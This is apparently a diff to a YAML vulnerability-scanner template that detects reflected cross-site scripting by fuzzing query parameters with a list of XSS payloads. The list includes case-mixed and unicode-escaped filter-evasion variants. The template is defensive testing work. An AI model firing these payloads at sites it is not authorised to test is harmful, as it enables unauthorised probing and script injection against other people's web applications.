@@ -1,35 +1,48 @@
 id: reflected-xss
+
 info:
-  name: Reflected Cross-Site Scripting (XSS)
-  author: KhukuriRimal
-  severity: Critical
-  description: Detects reflected XSS vulnerability
+  name: Reflected Cross Site Scripting
+  author: pdteam
+  severity: medium
+  tags: xss,rxss,dast
+
+variables:
+  first: "{{rand_int(10000, 99999)}}"
+
 http:
   - method: GET
     path:
-        - "{{BaseURL}}"
+      - "{{BaseURL}}"
+
     payloads:
-      injection:
-      - "<script>alert('XSS')</script>"
-      - "'><script>alert('XSS')</script>"
-      - "\"><script>alert('XSS')</script>"
-      - "<img src=x onerror=alert('XSS')>"
-      - "';alert('XSS');//"
-      - "\"><svg/onload=alert('XSS')>"
-      - "<iframe src=javascript:alert('XSS')>"
-      - "\"><body onload=alert('XSS')>"
+      reflection:
+        - "'\"><{{first}}"
+        - "<img src=x onerror=alert({{first}})>"
+        - "<script>alert({{first}})</script>"
+        - "'><ScRiPt>alert({{first}})</sCrIpT>"
+        - "</script><ScRiPt>alert({{first}})</sCrIpT>"
+        - "</script><script>alert({{first}})</script>"
+        - "<body onload=alert({{first}})>"
+        - "<marquee><img src=x onerror=confirm({{first}})></marquee>"
+        - "'><img%20src=xxx:x%20\x20onerror=javascript:alert({{first}})>"
+        - "\u0022\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e"
+
     fuzzing:
       - part: query
-        type: replace
+        type: postfix
         mode: single
         fuzz:
-            - "{{injection}}"
+          - "{{reflection}}"
+
     stop-at-first-match: true
+    matchers-condition: and
     matchers:
-     - type: word
-       words:
-       - "<script>alert('XSS')</script>"
-       - "alert('XSS')"
-       - "onerror=alert('XSS')"
-       - "onload=alert('XSS')"
-       condition: or
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
